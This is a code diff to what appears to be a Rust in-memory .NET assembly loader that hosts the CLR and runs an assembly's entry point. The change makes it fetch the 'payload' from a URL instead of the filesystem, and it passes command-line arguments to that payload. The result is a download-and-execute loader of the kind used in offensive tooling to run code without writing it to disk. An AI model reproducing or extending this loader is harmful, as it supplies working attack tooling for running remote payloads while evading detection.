@@ -9,7 +9,7 @@ use clr::core::appdomain::IAppDomain;
 use clr::core::assembly::IAssembly;
 use clr::core::methodinfo::IMethodInfo;
 use clr::util;
-use file::get_payload_from_filesystem;
+use file::{get_payload_from_filesystem, get_payload_from_url};
 use windows::Win32::System::Com::{SAFEARRAY, SAFEARRAYBOUND};
 use windows::Win32::System::Ole::{SafeArrayAccessData, SafeArrayCreate, SafeArrayUnaccessData};
 use windows::Win32::System::Variant::{VARIANT, VT_UI1};
@@ -35,8 +35,8 @@ fn main() {
 
     let appdomain = cor_runtime_host.create_domain();
 
-    let buf =
-        get_payload_from_filesystem(commandline.url);
+    //let buf = get_payload_from_filesystem(commandline.url);
+    let buf = get_payload_from_url(commandline.url);
 
     let mut bounds = SAFEARRAYBOUND {
         cElements: buf.len() as _,
@@ -72,7 +72,7 @@ fn main() {
 
     let obj = VARIANT::default();
     let mut pRetVal = VARIANT::default();
-    let args = vec![String::from("test1"), String::from("test2")];
+    let args = commandline.derive_command;
     let args_safearray_ptr = util::create_safearray_from_strings(&args).unwrap();
     unsafe {
         entrypoint
